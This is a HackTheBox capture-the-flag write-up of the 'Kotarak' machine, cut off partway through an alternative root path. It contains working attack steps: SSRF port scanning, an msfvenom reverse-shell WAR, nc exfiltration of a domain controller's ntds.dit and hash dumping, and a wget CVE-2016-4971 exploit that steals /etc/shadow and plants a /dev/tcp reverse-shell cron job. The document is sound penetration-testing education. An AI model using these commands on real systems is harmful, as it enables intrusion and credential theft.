---
title: HTB: Kotarak
url: https://0xdf.gitlab.io/2021/05/19/htb-kotarak.html
date: 2021-05-19T09:00:00+00:00
difficulty: Hard [40]
os: Linux
tags: htb-kotarak, ctf, hackthebox, nmap, tomcat, feroxbuster, ssrf, msfvenom, war, container, lxc, ntds, secretsdump, wget, cve-2016-4971, authbind, disk, lvm, htb-nineveh, htb-jerry, htb-tabby, oscp-plus-v1
---

![Kotarak](https://0xdfimages.gitlab.io/img/kotarak-cover.png)

Kotarak was an old box that I had a really fun time replaying for a writeup. It starts with an SSRF that allows me to find additional webservers on ports only listening on localhost. I’ll use that to leak a Tomcat config with username and password, and upload a malicious war to get a shell. From there, I can access files from an old Windows pentest to include an ntds.dit file and a system hive. That’s enough to dump a bunch of hashes, one of which cracks and provides creds I can use to get the next user. The root flag is actually in a container that is using Wget to request a file every two minutes. It’s an old vulnerable version, and a really neat exploit that involves sending a redirect to an FTP server and using that to write a malicious config file in the root home directory in the container. I’ll also show an alternative root abusing the user’s disk group to exfil the entire root filesystem and grab the flag on my local system.

## Box Info

| Name | [Kotarak](https://hackthebox.com/machines/kotarak)  [Kotarak](https://hackthebox.com/machines/kotarak) [Play on HackTheBox](https://hackthebox.com/machines/kotarak) |
| --- | --- |
| Release Date | [23 Sep 2017](https://twitter.com/hackthebox_eu/status/910862816508248069) |
| Retire Date | 10 Mar 2018 |
| OS | Linux Linux |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Kotarak |
| Radar Graph | Radar chart for Kotarak |
| First Blood User | 07:36:13[olihough86 olihough86](https://app.hackthebox.com/users/8976) |
| First Blood Root | 22:38:59[arkantolo arkantolo](https://app.hackthebox.com/users/1183) |
| Creator | [mrb3n mrb3n](https://app.hackthebox.com/users/2984) |

## Recon

### nmap

`nmap` found four open TCP ports, SSH (22), HTTP Tomcat (8080), Tomcat AJP (8009), and HTTP Apache (60000):

```

oxdf@parrot$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.55
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-13 17:11 EDT
Nmap scan report for 10.10.10.55
Host is up (0.022s latency).                                                    
Not shown: 65530 closed ports                                                   
PORT      STATE    SERVICE                                                      
22/tcp    open     ssh                                                          
8009/tcp  open     ajp13     
8080/tcp  open     http-proxy
32939/tcp filtered unknown                                                      
60000/tcp open     unknown                                                      
                                                                                
Nmap done: 1 IP address (1 host up) scanned in 11.39 seconds
oxdf@parrot$ nmap -p 22,8009,8080,60000 -sCV -oA scans/nmap-tcpscripts 10.10.10.55
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-13 17:12 EDT
Nmap scan report for 10.10.10.55
Host is up (0.019s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e2:d7:ca:0e:b7:cb:0a:51:f7:2e:75:ea:02:24:17:74 (RSA)
|   256 e8:f1:c0:d3:7d:9b:43:73:ad:37:3b:cb:e1:64:8e:e9 (ECDSA)
|_  256 6d:e9:26:ad:86:02:2d:68:e1:eb:ad:66:a0:60:17:b8 (ED25519)
8009/tcp  open  ajp13   Apache Jserv (Protocol v1.3)
| ajp-methods: 
|   Supported methods: GET HEAD POST PUT DELETE OPTIONS
|   Potentially risky methods: PUT DELETE
|_  See https://nmap.org/nsedoc/scripts/ajp-methods.html
8080/tcp  open  http    Apache Tomcat 8.5.5
|_http-favicon: Apache Tomcat
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-title: Apache Tomcat/8.5.5 - Error report
60000/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title:         Kotarak Web Hosting        
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.10 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu Xenial 16.04.

### Tomcat - TCP 8080

Visiting the site at `http://10.10.10.55:8080` just returns a 404:

![image-20210513172136703](https://0xdfimages.gitlab.io/img/image-20210513172136703.png)

I can check the Tomcat manager page at `/manager/html`, but it wants username and password:

![image-20210513172356495](https://0xdfimages.gitlab.io/img/image-20210513172356495.png)

None of the defaults work.

I did run [FeroxBuster](https://github.com/epi052/feroxbuster) against the site, and it returned a lot, but nothing particularly interesting. It’s all default Tomcat stuff, and all requires credentials.

### Tomcat AJP - TCP 8009

TCP 8009 is a default Tomcat port, and it gives access to the same kind of stuff that I would get with `/manager/html` on 8080, but using a binary protocol instead of HTTP. Hacktricks has a post on [Pentesting AJP](https://book.hacktricks.xyz/pentesting/8009-pentesting-apache-jserv-protocol-ajp), but there’s not a ton here.

I did play with the [ghostcat script](https://www.exploit-db.com/exploits/48143) a bit to see if I could exfil files, and I could read the `WEB-INF/web.xml` like in the example:

```

oxdf@parrot$ python2 ghostcat.py -p 8009 -f WEB-INF/web.xml 10.10.10.55
Getting resource at ajp13://10.10.10.55:8009/asdf
----------------------------
<?xml version="1.0" encoding="UTF-8"?>
<!--
...[snip]...
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd"
  version="3.1"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to Tomcat
  </description>

</web-app>

```

Still, there’s not much of interest in that folder, and trying to read outside that folder fails.

### HTTP - TCP 60000

#### Site

The site is the Kotarak Web Hosting Private Browser:

![image-20210513173429593](https://0xdfimages.gitlab.io/img/image-20210513173429593.png)

None of the links lead anywhere.

#### Tech Stack

The HTTP response headers don’t show much besides Apache. Guessing at what page the root might be, `index.html` doesn’t exist, but `index.php` does, so the site is running PHP over Apache.

#### Directory Brute Force

Running [FeroxBuster](https://github.com/epi052/feroxbuster) with `-x php` to include PHP extensions shows three pages:

```

oxdf@parrot$ feroxbuster -u http://10.10.10.55:60000 -o scans/ferox-60000-root -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.2.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.55:60000
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.2.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💾  Output File           │ scans/ferox-60000-root
 💲  Extensions            │ [php]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
403       11l       32w      302c http://10.10.10.55:60000/server-status
200       76l      130w     1169c http://10.10.10.55:60000/index.php
200        2l        0w        2c http://10.10.10.55:60000/url.php
200     1110l     5668w        0c http://10.10.10.55:60000/info.php
[####################] - 31s    59998/59998   0s      found:4       errors:0      
[####################] - 30s    59998/59998   1936/s  http://10.10.10.55:60000

```

`/info.php` runs `phpinfo()`:

![image-20210513174032104](https://0xdfimages.gitlab.io/img/image-20210513174032104.png)

`file_uploads` is on:

![image-20210513174221955](https://0xdfimages.gitlab.io/img/image-20210513174221955.png)

This means if I can find an LFI, I can get RCE through the PHPInfo page like I showed in [Nineveh](/2020/04/22/htb-nineveh.html#shell-as-www-data-via-phpinfophp). I’ll keep an eye out for that.

`/index.php` is the main page.

#### Loading a URL

The page asks me to submit a url for it to scan. I’ll start a Python webserver on my host (`python3 -m http.server 80`) and then give it my host as a url (`http://10.10.14.15/`). It connects:

```
10.10.10.55 - - [13/May/2021 17:37:38] "GET / HTTP/1.1" 200 -

```

And then shows the empty directory:

![image-20210513174417628](https://0xdfimages.gitlab.io/img/image-20210513174417628.png)

I can try some things to read local files from Kotarak. Giving it `file:///etc/passwd` returns “try harder”

## Shell as Tomcat on dmz

### Get Tomcat Password

#### SSRF Check

I can use this to check for listening ports on Kotarak. For example, when I `curl` port 22, I get the SSH banner, and then an error:

```

oxdf@parrot$ curl http://10.10.10.55:60000/url.php?path=http%3A%2F%2F127.0.0.1%3A22
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2
Protocol mismatch.

```

Looking at port 10 (unlikely to be listening), there’s an empty response:

```

oxdf@parrot$ curl http://10.10.10.55:60000/url.php?path=http%3A%2F%2F127.0.0.1%3A10

```

#### Loop

I can create a Bash loop to check all 65535 ports for responses:

```

for i in {0..65535}; do 
  res=$(curl -s http://10.10.10.55:60000/url.php?path=http%3A%2F%2F127.0.0.1%3A${i});
  len=$(echo $res | wc -w); 
  if [ "$len" -gt "0" ]; then
    echo -n "${i}: "; 
    echo $res | tr -d "\r" | head -1 | cut -c-100; 
  fi;
done

```

This will loop over the numbers 0 to 65535. For each, it will submit `http://127.0.0.1:${i}` to the Kotarak browser, where `${i}` is the Bash variable. It will store the result in `$res`. It gets the length of `$res`, and if that’s longer than 0, it prints `${i}` and the first line of `$res` up to 100 characters.

Running this got through about 1000 ports per minute, so it got through the first 1000 ports pretty quickly, but the entire loop takes a while. I can start enumerating the lower ports right away, but I let it run to completion because this box already had a service hidden at tcp 60000 (and I had to step away from the computer for a bit anyway).

```

oxdf@parrot$ time for i in {1..65535}; do res=$(curl -s http://10.10.10.55:60000/url.php?path=http%3A%2F%2F127.0.0.1%3A${i}); len=$(echo $res | wc -w); if [ "$len" -gt "0" ]; then echo -n "${i}: "; echo $res | tr -d "\r" | head -1 | cut -c-100; fi; done
22: SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2 Protocol mismatch.
90: <!DOCTYPE> <html> <head> <title>Under Construction</title> </head> <bodyd> <p>This page is under con
110: <html> <head> <title> favorites / bookmark title goes here </title> </head> <body bgcolor="white" te
200: <b>Hello world!</b>
320: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"><html> <he
888: <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"> <head> <meta http-equiv="content
-bash: warning: command substitution: ignored null byte in input
3306: 5.7.19-0ubuntu0.16.04.1 %t&Jz/a,X?JFLymysql_native_passwordot packets out of order
8080: <!DOCTYPE html><html><head><title>Apache Tomcat/8.5.5 - Error report</title><style type="text/css">H
60000: <!DOCTYPE html> <html> <head> <style> div.container { width: 100%; border: 1px solid gray; } header,

real    60m47.560s
user    8m4.942s
sys     10m12.692s

```

#### Enumerating Servers

I can step through the different ports identified above. SSH (22), Tomcat (8080, though interestingly no response from 8009), and 60000 (Apache) are the same services available to the outside. 3306 looks like MySQL, which makes sense for that port. I could play with trying to use Gopher to access it, though without creds, that seems like a longshot.

There are likely HTML pages on 90, 110, 200, 320, and 888. I’ll jump back to the 60000 webpage to check those out.

90 returns:

```

<!DOCTYPE>
<html>
<head>
<title>Under Construction</title>
</head>
<bodyd>
<p>This page is under construction. Please come back soon!</p>
</body>
</html>

```

110 has another dummy page:

```

<html>

<head>
<title> favorites / bookmark title goes here </title>
</head>

<body bgcolor="white" text="blue">

<h1>Test page </h1>

Absolutely nothing to see here.

</body>

</html>

```

As does 200:

```

<b>Hello world!</b>

```

320 has a login form:

![image-20210514073306376](https://0xdfimages.gitlab.io/img/image-20210514073306376.png)

This is interesting. I can’t just put a password in and try to login, as the POST goes back to the service on 60000, not the on on 320. I can come back to this and play with trying to send a POST request using Gopher or something else, but I didn’t end up using this, and confirmed on rooting that it was just a static page, so a rabbit hole.

Port 888 presents a “Simple File Viewer”:

![image-20210514073528155](https://0xdfimages.gitlab.io/img/image-20210514073528155.png)

The images don’t load (the references are to port 888, and my browser can’t access those). And the links are broken on clicking on them as they look like:

```

<a href="?doc=on"  class="tableElement">

```

Clicking this will load `http://10.10.10.55:60000/url.php?doc=on`. But if I was directly visiting `http://127.0.0.1:888`, it would load `http://127.0.0.1:888/?doc=on`. I can put that into the Kotarak browser, and it returns nothing. That makes sense, as the page says `on` is zero bytes. Of the three files of any size, two aren’t useful. `blah` is a bunch of As, `tetris.c` is exactly what you might expect, C code for a game that looks like Tetris. `backup` is:

![image-20210514074103740](https://0xdfimages.gitlab.io/img/image-20210514074103740.png)

This is the `tomcat_users.xml` file that configures access to Tomcat.

### Malicious WAR

#### Access Tomcat Manager

The admin user in the backup file has access to `manager` and `manager-gui`, so I’ll try visiting `http://10.10.10.55:8080` again, and entering the creds lets me in:

![image-20210514090529954](https://0xdfimages.gitlab.io/img/image-20210514090529954.png)

#### Generate WAR

To get a shell from here is relatively simple, just like in [Jerry](/2018/11/17/htb-jerry.html#exploiting-tomcat) and [Tabby](/2020/11/07/htb-tabby.html#text-based-manager) (though in Tabby I had to use the text-based manager instead of the html one because the user I leaked had only `manager-script`).

I’ll generate a reverse shell payload using `msfvenom`:

```

oxdf@parrot$ msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.15 LPORT=443 -f war -o rev.war
Payload size: 13318 bytes
Final size of war file: 13318 bytes
Saved as: rev.war

```

#### Upload

To upload the WAR, I’ll use the “WAR file to deploy” section on the page, using the browse button to select `rev.war`:

![image-20210514091040405](https://0xdfimages.gitlab.io/img/image-20210514091040405.png)

On hitting Deploy, `/rev` now shows up as an application:

![image-20210514091140439](https://0xdfimages.gitlab.io/img/image-20210514091140439.png)

With `nc` listening, I’ll click `/rev`, and it returns a blank page, but also a shell at `nc`:

```

oxdf@parrot$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.55] 51386
id
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)

```

Shell upgrade with the standard trick:

```

python -c 'import pty;pty.spawn("bash")'
tomcat@kotarak-dmz:/$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@parrot$ stty raw -echo ; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
                                                                         
tomcat@kotarak-dmz:/$

```

## Shell as atanas on dmz

### Enumeration

#### Hosts

The hostname with this shell is kotarak-dmz, which implies there’s another host I will try to go after.

The `ifconfig` shows that the IP of this host is 10.10.10.55, which for HTB means that I’m on the main VM. There’s also a lxcbr0 adapter with the IP 10.0.3.1. LXC is a container system, so I suspect I need to get into a container on that network.

#### Homedirs

I’ll There are two home directories on this dmz host:

```

tomcat@kotarak-dmz:/home$ ls
atanas  tomcat

```

`user.txt` is in `atanas`, but I can’t read it as tomcat:

```

tomcat@kotarak-dmz:/home$ ls -l atanas/
total 4
-rw-rw---- 1 atanas atanas 33 Jul 19  2017 user.txt

```

`/home/tomcat` (which isn’t actually the home directory for the tomcat user, but it’s still there) holds two files in a subdirectory:

```

tomcat@kotarak-dmz:/home/tomcat$ find . -type f
./to_archive/pentest_data/20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin
./to_archive/pentest_data/20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit

```

The `.bin` reports to be a Windows registry file, where as `file` doesn’t recognize the `.dit` as anything more than data:

```

tomcat@kotarak-dmz:/home/tomcat/to_archive/pentest_data$ file *
20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit: data
20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin: MS Windows registry file, NT/2000 or above

```

The `.dit` is likely the active directory database from a domain controller, `ntds.dit`.

I’ll exfil each over `nc`. For example, I’ll start a listener with `nc -lnvp 443 > 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit` on my VM, and then run `cat 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit | nc 10.10.14.15 443` on Kotarak.

### Recover Passwords

#### Dump Hashes

`secretsdump` will extract all the hashes from an `ntds.dit` file using the SYSTEM reg hive to decrypt:

```

oxdf@parrot$ secretsdump.py -ntds 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit -system 20170721114637_de
fault_192.168.110.133_psexec.ntdsgrab._089134.bin LOCAL | tee addump
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x14b6fb98fedc8e15107867c4722d1399
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient                                           
[*] PEK # 0 found and decrypted: d77ec2af971436bccb3b6fc4a969d7ff
[*] Reading and decrypting hashes from 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e64fe0f24ba2489c05e64354d74ebd11:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WIN-3G2B0H151AC$:1000:aad3b435b51404eeaad3b435b51404ee:668d49ebfdb70aeee8bcaeac9e3e66fd:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ca1ccefcb525db49828fbb9d68298eee:::
WIN2K8$:1103:aad3b435b51404eeaad3b435b51404ee:160f6c1db2ce0994c19c46a349611487:::
WINXP1$:1104:aad3b435b51404eeaad3b435b51404ee:6f5e87fd20d1d8753896f6c9cb316279:::
WIN2K31$:1105:aad3b435b51404eeaad3b435b51404ee:cdd7a7f43d06b3a91705900a592f3772:::
WIN7$:1106:aad3b435b51404eeaad3b435b51404ee:24473180acbcc5f7d2731abe05cfa88c:::
atanas:1108:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
...[snip]...

```

I’ve used `tee` to write the output to a file so I can easily grab the NTLM hashes from the output:

```

oxdf@parrot$ cat addump | grep ":::" | cut -d: -f4
e64fe0f24ba2489c05e64354d74ebd11
31d6cfe0d16ae931b73c59d7e0c089c0
668d49ebfdb70aeee8bcaeac9e3e66fd
ca1ccefcb525db49828fbb9d68298eee
160f6c1db2ce0994c19c46a349611487
6f5e87fd20d1d8753896f6c9cb316279
cdd7a7f43d06b3a91705900a592f3772
24473180acbcc5f7d2731abe05cfa88c
2b576acbe6bcfda7294d6bd18041b8fe

```

#### Crack

I can run these through `hashcat`, but as NTLM hashes aren’t salted per user, any word I would check without some customization to the target has already been calculated by sites like [crackstation.net](https://crackstation.net/). Three of the passwords break:

![image-20210515061224000](https://0xdfimages.gitlab.io/img/image-20210515061224000.png)

The empty password isn’t too useful, but I’ll note the other two. Password123! is associated with the atanas user in this dump, and f16tomcat! is associated with the administrator account.

### su

atanas doesn’t have permissions to SSH using a password, but this password will work with `su` from the local shell as tomcat:

```

tomcat@kotarak-dmz:~$ su atanas -
Password: 
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
atanas@kotarak-dmz:/opt/tomcat$

```

atanas has permission to read `user.txt`:

```

atanas@kotarak-dmz:~$ cat user.txt
93f844f5************************

```

## Shell as root

### Enumeration

Unlike most HTB machines, as this user I can enter and list files in `/root`:

```

atanas@kotarak-dmz:/root$ ls -l
total 8
-rw------- 1 atanas root 333 Jul 20  2017 app.log
-rw------- 1 atanas root  66 Aug 29  2017 flag.txt

```

In fact, not only can I list the files, but read both `flag.txt` and `app.log`. `flag.txt` is a hint to continue looking:

```

atanas@kotarak-dmz:/root$ cat flag.txt 
Getting closer! But what you are looking for can't be found here.

```

I interpret this to mean that it’s on another host, as I noted earlier that there are likely containers involved on this system.

`app.log` shows what look like Apache `access.log` entries:

```
10.0.3.133 - - [20/Jul/2017:22:48:01 -0400] "GET /archive.tar.gz HTTP/1.1" 404 503 "-" "Wget/1.16 (linux-gnu)"
10.0.3.133 - - [20/Jul/2017:22:50:01 -0400] "GET /archive.tar.gz HTTP/1.1" 404 503 "-" "Wget/1.16 (linux-gnu)"
10.0.3.133 - - [20/Jul/2017:22:52:01 -0400] "GET /archive.tar.gz HTTP/1.1" 404 503 "-" "Wget/1.16 (linux-gnu)"

```

Some observations:
1. There’s another system on 10.0.3.133. This makes sense given I noted the additional IP address on this host of 10.0.3.1 earlier. That host still exists:

   ```

   atanas@kotarak-dmz:/root$ ping -c 1 10.0.3.133
   PING 10.0.3.133 (10.0.3.133) 56(84) bytes of data.
   64 bytes from 10.0.3.133: icmp_seq=1 ttl=64 time=0.070 ms
   --- 10.0.3.133 ping statistics ---
   1 packets transmitted, 1 received, 0% packet loss, time 0ms
   rtt min/avg/max/mdev = 0.070/0.070/0.070/0.000 ms

   ```
2. The requests seem to be arriving every two minutes.
3. The requests come from `wget`, version 1.16.

### Requests

#### Binding

The first question I had is if these requests are still coming. To check that, I need some way to listen on port 80 on this host. Unfortunately, by default, a non-root user can’t listen on a port below 1024:

```

atanas@kotarak-dmz:/root$ nc -lnvp 80
nc: Permission denied
atanas@kotarak-dmz:/root$ python3 -m http.server 80
Traceback (most recent call last):
  File "/usr/lib/python3.5/runpy.py", line 184, in _run_module_as_main
    "__main__", mod_spec)
  File "/usr/lib/python3.5/runpy.py", line 85, in _run_code
    exec(code, run_globals)
  File "/usr/lib/python3.5/http/server.py", line 1221, in <module>
    test(HandlerClass=handler_class, port=args.port, bind=args.bind)
  File "/usr/lib/python3.5/http/server.py", line 1194, in test
    httpd = ServerClass(server_address, HandlerClass)
  File "/usr/lib/python3.5/socketserver.py", line 440, in __init__
    self.server_bind()
  File "/usr/lib/python3.5/http/server.py", line 138, in server_bind
    socketserver.TCPServer.server_bind(self)
  File "/usr/lib/python3.5/socketserver.py", line 454, in server_bind
    self.socket.bind(self.server_address)
PermissionError: [Errno 13] Permission denied

```

I spent a bit of time looking for any binaries with capabilities that might allow them to bind, but no luck. I did come across `authbind`:

```

atanas@kotarak-dmz:/root$ which authbind 
/usr/bin/authbind

```

`authbind` is a program that [allows non-root users to bind on low ports](https://en.wikipedia.org/wiki/Authbind).

With `authbind`, I’m able to listen on port 80 without issue:

```

atanas@kotarak-dmz:/root$ authbind nc -lnvp 80
Listening on [0.0.0.0] (family 0, port 80)

```

#### Request

I’ll use `nc` so I can see what a full request looks like if it comes. In less than two minutes, I get a connection from 10.0.3.133:

```

Connection from [10.0.3.133] port 80 [tcp/*] accepted (family 2, sport 49700)
GET /archive.tar.gz HTTP/1.1
User-Agent: Wget/1.16 (linux-gnu)
Accept: */*
Host: 10.0.3.1
Connection: Keep-Alive

```

Still using `wget` to request `/archive.tar.gz`.

### wget Vulnerability

#### CVE-2016-4971

The default `wget` behavior is to write the requested file to disk in the current directory with the filename indicated by the url. So when `wget` requests `http://website.com/folder/file.txt`, the default behavior is to save that as `./file.txt`.

CVE-2016-4971 is a neat exploit against Wget version < 1.18 that abuses has `wget` handles an HTTP redirect to an FTP server. When `wget` redirects to another address using http, it would get that file but still save it as the original requested filename.

So for example, if `wget` sends a GET request to `http://website.com/folder/file.txt`, and the server responds with a 301 or 302 redirect to `ftp://evil-server.com/evil.txt`, `wget` will go get that file (which is fine) and save it as `evil.txt` (which is not fine).

Especially in a `cron` scenario, the jobs typically run out of the running user’s home directory. The ability to write arbitrary files in a home directory is dangerous.

#### POC

There are many ways to exploit this vulnerability. I could drop a `.bashrc` file and wait for someone to start a shell. If I thought perhaps the `wget` was being run from a web directory, I could look at uploading a webshell.

There’s a proof of concept for this CVE on [exploitdb](https://www.exploit-db.com/exploits/40064). It’s strategy is to write a Wget Startup file. Based on the [priority](https://www.gnu.org/software/wget/manual/html_node/Wgetrc-Location.html) `wget` looks for these files, as long as there’s nothing in the `/usr/local/etc/wgetrc` and the env variable `WGETRC` isn’t set, it will try to load from `$HOME/.wgetrc`.

This fill will set arguments for `wget` that aren’t passed on the command line. The POC uses two of these with the following `.wgetrc` file:

```

post_file = /etc/shadow
output_document = /etc/cron.d/wget-root-shell

```

This sets two [options](https://www.gnu.org/software/wget/manual/html_node/Wgetrc-Commands.html):
- `post_file`:

  > Use POST as the method for all HTTP requests and send the contents of file in the request body. The same as ‘–post-file=file’.
- `output_document`:

  > Set the output filename—the same as ‘-O file’.

This POC will exploit over the course of two requests (so it’s targeted against a process where `wget` is running on `cron`, which seems perfect for Kotarak).

The first request is what is exploited by this exploit, to write the `.wgetrc` file into the running home directory. The next time it goes to make the same request, it will POST the shadow file, and then save the result into the `/etc/cron.d` directory.

#### Run It

I’ll need multiple shells on the box, either by trigger the WAR file a few times. I’ll work out of a directory in `/tmp`. In one shell, I’ll drop the `.wgetrc` file:

```

atanas@kotarak-dmz:/tmp/.0xdf$ cat <<_EOF_>.wgetrc                              
> post_file = /etc/shadow
> output_document = /etc/cron.d/wget-root-shell                                 
> _EOF_  

```

And start a Python FTP server:

```

atanas@kotarak-dmz:/tmp/.0xdf$ authbind python -m pyftpdlib -p21 -w
/usr/local/lib/python2.7/dist-packages/pyftpdlib/authorizers.py:243: RuntimeWarning: write permissions assigned to anonymous user.
  RuntimeWarning)
[I 2021-05-15 13:32:46] >>> starting FTP server on 0.0.0.0:21, pid=26421 <<<
[I 2021-05-15 13:32:46] concurrency model: async
[I 2021-05-15 13:32:46] masquerade (NAT) address: None
[I 2021-05-15 13:32:46] passive ports: None

```

I’ll save a copy of the Python POC locally and make a few edits. It’s got `go_GET` and a `do_POST` methods to handle incoming requests. It assumed the first request will be a GET, and will redirect that to get the `.wgetrc`. Then the next request will be a POST if that worked, and that’s where it returns the `cron` file. Those functions are fine. There’s some configuration at the bottom that needs updating:

```

HTTP_LISTEN_IP = '10.0.3.1' 
HTTP_LISTEN_PORT = 80
FTP_HOST = '10.10.10.55' 
FTP_PORT = 21

ROOT_CRON = "* * * * * root bash -c 'bash -i >& /dev/tcp/10.10.14.15/443 0>&1' \n"

```

The HTTP listen needs to be on the IP that the container is connecting to.

Now the `cron` will result in a reverse shell. With a Python webserver in my VM, I’ll grab it with `wget`:

```

atanas@kotarak-dmz:/tmp/.0xdf$ wget 10.10.14.15/wget_exploit.py
--2021-05-15 13:38:07--  http://10.10.14.15/wget_exploit.py
Connecting to 10.10.14.15:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2616 (2.6K) [text/x-python]
Saving to: ‘wget_exploit.py’

wget_exploit.py     100%[===================>]   2.55K  --.-KB/s    in 0.001s  

2021-05-15 13:38:07 (2.50 MB/s) - ‘wget_exploit.py’ saved [2616/2616]

```

Now run it with `authbind`, and it checks that the FTP server is good, and then waits:

```

atanas@kotarak-dmz:/tmp/.0xdf$ authbind python wget_exploit.py 
Ready? Is your FTP server running?
FTP found open on 10.10.10.55:21. Let's go then

Serving wget exploit on port 80...

```

There is a connection at the FTP server as well:

```

[I 2021-05-15 13:43:25] 10.10.10.55:36996-[] FTP session opened (connect)

```

After a minute, the first request comes in, a GET, and it’s handled with the redirect:

```

We have a volunteer requesting /archive.tar.gz by GET :)

Uploading .wgetrc via ftp redirect vuln. It should land in /root 
10.0.3.133 - - [15/May/2021 13:44:01] "GET /archive.tar.gz HTTP/1.1" 301 -
Sending redirect to ftp://anonymous@10.10.10.55:21/.wgetrc

```

Immediately after there’s another connecting on FTP:

```

[I 2021-05-15 13:44:01] 10.0.3.133:38434-[] FTP session opened (connect)
[I 2021-05-15 13:44:01] 10.0.3.133:38434-[anonymous] USER 'anonymous' logged in.
[I 2021-05-15 13:44:01] 10.0.3.133:38434-[anonymous] RETR /tmp/.0xdf/.wgetrc completed=1 bytes=70 seconds=0.002
[I 2021-05-15 13:44:01] 10.0.3.133:38434-[anonymous] FTP session closed (disconnect).

```

Now the config file is in place, the next time the script tries to run, I should see a POST request. It worked:

```

We have a volunteer requesting /archive.tar.gz by POST :)
                                        
Received POST from wget, this should be the extracted /etc/shadow file:   
---[begin]---
 root:*:17366:0:99999:7:::
daemon:*:17366:0:99999:7:::
bin:*:17366:0:99999:7:::
...[snip]...
sshd:*:17366:0:99999:7:::
ubuntu:$6$edpgQgfs$CcJqGkt.zKOsMx1LCTCvqXyHCzvyCy1nsEg9pq1.dCUizK/98r4bNtLueQr4ivipOiNlcpX26EqBTVD2o8w4h0:17368:0:99999:7:::
---[eof]---

Sending back a cronjob script as a thank-you for the file...
It should get saved in /etc/cron.d/wget-root-shell on the victim's host (because of .wgetrc we injected in the GET first response)
10.0.3.133 - - [15/May/2021 13:46:01] "POST /archive.tar.gz HTTP/1.1" 200 -

File was served. Check on /root/hacked-via-wget on the victim's host in a minute! :)

```

The `shadow` file doesn’t have anything that useful in it. But hopefully this indicates that the `cron` was written. One minute later:

```

oxdf@parrot$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.55] 48402
bash: cannot set terminal process group (3240): Inappropriate ioctl for device
bash: no job control in this shell
root@kotarak-int:~# id
uid=0(root) gid=0(root) groups=0(root)

```

This shell on the on host kotarak-int, and it has landed me as root. I can read `root.txt`:

```

root@kotarak-int:~# cat root.txt
950d1425************************

```

### Alternative Root via Disk

#### Enumeration

I actually found this root before finding the intended path. The first thing I check when I get a shell is the groups the user is in with the `id` command:

```

atanas@kotarak-dmz:/$ id
uid=1000(atanas) gid=1000(atanas) groups=1000(atanas),4(adm),6(disk),24(cdrom),30(dip),34(backup),46(plugdev),115(lpadmin),116(sambashare)

```

I also knew at this point that there was another container involved this box, and that I likely needed to get into it. I don’t see the lxc group here (or docker if this was running in Docker containers), which doesn’t let me interact with the container directly. But atanas is in the disk group, which gives access to the raw devices.

`lsblk` shows how the devices are configured:

```

atanas@kotarak-dmz:~$ lsblk
